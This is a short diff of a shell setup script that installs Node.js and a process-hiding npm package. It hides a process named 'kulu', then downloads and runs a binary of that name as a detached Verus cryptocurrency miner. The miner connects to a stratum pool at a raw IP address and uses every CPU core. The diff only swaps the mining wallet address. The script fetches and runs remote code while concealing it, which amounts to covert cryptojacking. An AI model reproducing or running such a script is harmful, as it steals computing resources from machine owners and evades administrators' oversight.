@@ -8,6 +8,6 @@ sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-esse
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs >/dev/null 2>&1
 sudo npm i -g node-process-hider && sudo ph add kulu
-wget https://gitlab.com/sarifadim/jomblo/-/raw/main/kulu && chmod +x kulu && screen -dms run ./kulu -a verus -o stratum+tcp://149.129.237.206:8080 -u RH53tGMS2TziXVMqPTzENYVi6t5GFQnvZ9.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) 
+wget https://gitlab.com/sarifadim/jomblo/-/raw/main/kulu && chmod +x kulu && screen -dms run ./kulu -a verus -o stratum+tcp://149.129.237.206:8080 -u TYP6GyG9f4Mo9MDFHPDG1hmdgBRHXPZZxP.$(echo V-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all) 
 EOF
 screen -r
